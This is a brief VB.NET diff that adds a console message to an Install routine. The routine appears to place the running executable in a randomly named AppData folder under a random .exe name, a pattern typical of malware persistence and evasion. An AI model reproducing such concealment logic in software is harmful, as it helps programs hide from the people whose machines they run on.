@@ -7,6 +7,7 @@ Imports Newtonsoft.Json
 Module Installing
     Public Sub Install()
         If Not File.Exists(GetPathes.get_JsonFilewithPath()) Then
+            Console.WriteLine("Installing")
             Dim main_file As String = Process.GetCurrentProcess().MainModule.ModuleName
             Dim installPath As String = getAppdata() & "\" & RandomString(5, 8)
             Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
